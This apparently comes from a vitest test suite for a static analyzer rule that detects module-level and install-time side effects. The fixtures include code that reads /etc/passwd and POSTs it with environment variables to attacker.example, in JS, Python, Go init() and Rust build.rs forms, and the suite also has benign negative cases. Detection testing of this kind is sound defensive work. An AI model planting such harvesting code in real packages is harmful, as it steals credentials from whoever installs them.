/**
 * Repro for cognium-dev Sprint 19 — Module-side-effect detection.
 *
 * Issues in scope:
 *   - #93  — npm postinstall / preinstall lifecycle droppers
 *            (shai-hulud / TruffleHog harvester shape, env-dump POST,
 *            child_process.exec at module top).
 *   - #96 L47 — Python module-import-time credential POST harvest
 *            (`requests.post(URL, data=dict(os.environ))` at module top).
 *   - #98  — Go `init()` and Rust `build.rs` install-time harvest
 *            (`exec.Command` / `Command::new` invocations).
 *
 * Layout:
 *   - #93.1  — JS module-level fs read + https.request (env harvest shape) → fires
 *   - #93.2  — JS module-level fetch(env) → fires
 *   - #93.3  — JS package.json with benign postinstall (`node-gyp rebuild`) → no fire
 *   - #96.L47.1 — Python module-level requests.post(dict(os.environ)) → fires
 *   - #96.L47.2 — Same call inside def upload() → no module-side-effect fire
 *   - #98.1  — Go func init() { exec.Command(...).Run() } → fires
 *   - #98.2  — Rust build.rs Command::new("sh") → fires
 *   - #98.3  — Rust build.rs with only println!("cargo:...") → no fire
 *
 * Target release: circle-ir 3.69.0 / cognium-dev 3.69.0
 */

import { describe, it, expect, beforeAll } from 'vitest';
import { initAnalyzer, analyze } from '../../src/analyzer.js';

describe('cognium-dev Sprint 19 — Module-side-effect pass', () => {
  beforeAll(async () => {
    await initAnalyzer();
  });

  const moduleSideEffectFindings = (
    findings: Array<{ rule_id?: string }> | undefined,
  ) => (findings ?? []).filter((f) => f.rule_id === 'module-side-effect');

  // ---------------------------------------------------------------------------
  // #93 — npm postinstall / module-top harvest fixtures
  // ---------------------------------------------------------------------------

  it('#93.1 — JS module-level fs.readFileSync + https.request should fire module-side-effect', async () => {
    const code = `const fs = require('fs');
const https = require('https');
const passwd = fs.readFileSync('/etc/passwd', 'utf8');
const req = https.request({
  host: 'attacker.example',
  method: 'POST',
}, () => {});
req.write(JSON.stringify({ env: process.env, passwd }));
req.end();
`;
    const r = await analyze(code, 'harvest.js', 'javascript');
    expect(moduleSideEffectFindings(r.findings).length).toBeGreaterThanOrEqual(1);
  });

  it('#93.2 — JS module-level fetch(process.env) POST should fire module-side-effect', async () => {
    const code = `fetch('https://attacker.example/x', {
  method: 'POST',
  body: JSON.stringify(process.env),
});
`;
    const r = await analyze(code, 'preload.js', 'javascript');
    expect(moduleSideEffectFindings(r.findings).length).toBeGreaterThanOrEqual(1);
  });

  it('#93.3 — package.json with benign postinstall (node-gyp rebuild) should NOT fire', async () => {
    const code = `{
  "name": "demo",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "node-gyp rebuild"
  }
}
`;
    const r = await analyze(code, 'package.json', 'javascript');
    expect(moduleSideEffectFindings(r.findings).length).toBe(0);
  });

  // ---------------------------------------------------------------------------
  // #96 L47 — Python import-time harvest
  // ---------------------------------------------------------------------------

  it('#96.L47.1 — Python module-top requests.post(os.environ) should fire module-side-effect', async () => {
    const code = `import os
import requests
requests.post('https://attacker.example/x', data=dict(os.environ))
`;
    const r = await analyze(code, 'pkg/__init__.py', 'python');
    expect(moduleSideEffectFindings(r.findings).length).toBeGreaterThanOrEqual(1);
  });

  it('#96.L47.2 — same call inside def upload() should NOT fire module-side-effect', async () => {
    const code = `import os
import requests
def upload():
    requests.post('https://example.com/x', data=dict(os.environ))
`;
    const r = await analyze(code, 'pkg/upload.py', 'python');
    expect(moduleSideEffectFindings(r.findings).length).toBe(0);
  });

  // ---------------------------------------------------------------------------
  // #98 — Go init() / Rust build.rs install-time harvest
  // ---------------------------------------------------------------------------

  it('#98.1 — Go func init() with exec.Command should fire module-side-effect', async () => {
    const code = `package main

import "os/exec"

func init() {
    exec.Command("curl", "https://attacker.example/x").Run()
}

func main() {}
`;
    const r = await analyze(code, 'main.go', 'go');
    expect(moduleSideEffectFindings(r.findings).length).toBeGreaterThanOrEqual(1);
  });

  it('#98.2 — Rust build.rs with Command::new("sh") should fire module-side-effect', async () => {
    const code = `use std::process::Command;

fn main() {
    Command::new("sh")
        .arg("-c")
        .arg("curl https://attacker.example/x")
        .output()
        .expect("failed");
}
`;
    const r = await analyze(code, 'build.rs', 'rust');
    expect(moduleSideEffectFindings(r.findings).length).toBeGreaterThanOrEqual(1);
  });

  it('#98.3 — Rust build.rs with only println!("cargo:...") should NOT fire', async () => {
    const code = `fn main() {
    println!("cargo:rustc-link-lib=foo");
    println!("cargo:rerun-if-changed=build.rs");
}
`;
    const r = await analyze(code, 'build.rs', 'rust');
    expect(moduleSideEffectFindings(r.findings).length).toBe(0);
  });
});
